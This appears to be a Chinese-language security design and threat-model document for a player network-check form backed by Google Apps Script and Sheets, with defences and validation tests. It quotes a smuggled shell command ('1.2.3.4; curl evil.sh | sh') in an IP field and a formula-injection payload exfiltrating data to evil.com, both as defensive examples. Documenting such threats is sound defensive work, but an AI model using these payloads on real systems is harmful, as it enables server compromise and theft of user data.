# Network Check — 安全設計

**建立：** 2026-09-10
**適用版本：** commit `8a132f7` 起

玩家提交的每一個欄位都是不可信輸入。本文記錄威脅模型、已實作的防禦，以及日後改動時不能破壞的前提。

---

## 最重要的前提

**Apps Script Web App 部署為「任何人」存取，端點 URL 等同公開。**

攻擊者不會使用前端表單，會直接 `curl` 打端點。因此：

> 前端的所有檢查（`maxlength`、檔案大小、`sanitizeText()`）**只是給正常玩家的 UX 提示，不是安全邊界**。
> 真正的防線全部在 `apps-script.js` 的 `doPost()`。

日後新增任何欄位，驗證一定要加在後端；只加前端等於沒加。

---

## 威脅模型與已實作防禦

### 1. 指令注入到維運人員的終端機（最高風險）

**攻擊路徑：** `payload.ip` → 組成 `ping -c 20 <ip>` 寫入「Ping Command」欄 → SOP 要求維運人員**複製該欄貼進遊戲伺服器 SSH 執行**。

送出 `{"ip": "1.2.3.4; curl evil.sh | sh"}` 就會在正式伺服器上執行任意指令。

**防禦：** `isValidIp()` 以嚴格 IPv4／IPv6 樣式比對，不通過就寫入 `no valid IP — do not run`，原始值仍存於 IP 欄供追查。

**改動時注意：** 任何要被人類複製去執行的欄位，都必須先過白名單式驗證，不能只做黑名單過濾。

### 2. Google Sheets 公式注入

**攻擊路徑：** 儲存格內容以 `=` `+` `-` `@` 開頭時，Sheets 會當作**公式執行**。玩家在 traceroute 欄貼上

```
=IMPORTXML("https://evil.com?d="&C2&G2, "//a")
```

只要 GTO 成員開啟試算表，其他玩家的 IP 與 Open ID 就會被送到攻擊者的伺服器。

**防禦：** `cellSafe()` 對每一個寫入值加前導單引號中和（單引號是 Sheets 的強制文字標記，不佔內容）。

**改動時注意：** `appendRow()` 的每一個元素都必須經過 `cellSafe()`，新增欄位時不能漏掉。

### 3. Drive 淪為釣魚頁面託管

**攻擊路徑：** 截圖的 `mimeType` 由前端指定，Apps Script 直接採信並以「知道連結的任何人可檢視」建檔。上傳 `text/html` 即可在 Google 網域下取得一個公開的釣魚網頁。

**防禦：** `imageKind()` 只認檔案本身的 magic bytes（JPEG／PNG／WebP／HEIC），不採信 `mimeType`，副檔名也由此決定。無法辨識就整筆丟棄。

### 4. 任意建立分頁

**攻擊路徑：** `payload.region` 未驗證就交給 `getOrCreateSheet()`，可無限灌新分頁。

**防禦：** `allowedRegions()` 讀取 `IP_Region` 分頁的 prefix 清單，未命中一律歸入 `Other`。

### 5. 洗版與資源耗盡

**防禦：** payload 上限 14MB、單欄位 200 字、traceroute 20000 字、截圖最多 4 張各 5MB、同 IP 30 秒一筆（`CacheService`）。控制字元一律移除，但**保留換行**以維持 traceroute 排版。

**已知限制：** 速率限制以 IP 為鍵，換 IP 即可繞過。要真正防洗版需要 CAPTCHA 或簽章 token，目前未實作。

### 6. 前端 HTML 注入（次要）

伺服器 label／IP 來自 `IP_Region` 試算表，且被內插進 `onclick="copyCmd('${cmd}', this)"`。試算表雖是內部可信來源，仍在 `renderStep2()` 先以樣式過濾 IP，避免誤植或帳號被盜時直接變成 XSS。

---

## 不適用的威脅

- **SQL injection**：整條資料鏈沒有任何 SQL（Google Sheets 不是資料庫）。過濾 `SELECT`／`DROP` 這類關鍵字不但無效，還會誤殺正常的 traceroute 內容。
- **Sheets 內的 XSS**：Sheets 不執行 HTML。但若日後把這些資料拿去產生 HTML 報表，就必須在**輸出端**做跳脫。

---

## 驗證方式

`docs/` 沒有附滲透腳本（內含正式端點 URL）。重新產生的方式：對端點直接 POST，檢查

| 測試 | 預期 |
|---|---|
| `"ip": "1.2.3.4; curl evil.sh \| sh"` | U 欄 = `no valid IP — do not run` |
| traceroute 或 nickname 填 `=IMPORTXML(...)` | 儲存格顯示公式原文，非執行結果 |
| 上傳 HTML 並標為 `image/jpeg` | 截圖欄 `—`，Drive 無新檔 |
| `"region": "HACKED"` | 寫入 `Other`，不建立新分頁 |
| 同 IP 連送 3 次 | 只寫入 1 列 |

注意速率限制會擋掉自己的連續測試 —— 無效 IP 共用 `anonymous` 計數桶，測多種注入變形時每筆需間隔 31 秒。

2026-09-10 已於正式環境完成上述全項驗證。
